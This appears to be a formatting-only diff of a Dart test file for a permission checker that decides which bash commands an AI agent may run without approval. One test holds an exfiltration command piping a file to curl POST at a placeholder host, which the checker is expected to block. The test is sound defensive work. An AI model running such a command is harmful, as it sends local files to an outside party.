@@ -5,18 +5,16 @@ void main() {
   group('PermissionMatcher.isSafeBashCommand - Integration tests', () {
     test('auto-approves safe simple commands', () {
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'ls -la'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'ls -la'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
 
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'pwd'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'pwd'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
 
@@ -136,7 +134,9 @@ void main() {
 
       expect(
         PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'cat file.txt | curl -X POST https://example.com'),
+          BashToolInput(
+            command: 'cat file.txt | curl -X POST https://example.com',
+          ),
           {'cwd': '/Users/test/project'},
         ),
         isFalse,
@@ -145,10 +145,9 @@ void main() {
 
     test('auto-approves cd within working directory', () {
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'cd src'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'cd src'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
 
@@ -161,28 +160,25 @@ void main() {
       );
 
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'cd .'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'cd .'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
     });
 
     test('blocks cd outside working directory', () {
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'cd ..'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'cd ..'), {
+          'cwd': '/Users/test/project',
+        }),
         isFalse,
       );
 
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'cd /etc'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'cd /etc'), {
+          'cwd': '/Users/test/project',
+        }),
         isFalse,
       );
 
@@ -233,10 +229,9 @@ void main() {
 
     test('handles empty command', () {
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: ''),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: ''), {
+          'cwd': '/Users/test/project',
+        }),
         isFalse,
       );
     });
@@ -295,10 +290,9 @@ void main() {
       );
 
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'ls 2>&1'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'ls 2>&1'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
     });
@@ -314,10 +308,9 @@ void main() {
       // We can't test HookServer directly here, but we can verify
       // that the safe command check works correctly
       expect(
-        PermissionMatcher.isSafeBashCommand(
-          BashToolInput(command: 'ls'),
-          {'cwd': '/Users/test/project'},
-        ),
+        PermissionMatcher.isSafeBashCommand(BashToolInput(command: 'ls'), {
+          'cwd': '/Users/test/project',
+        }),
         isTrue,
       );
     });
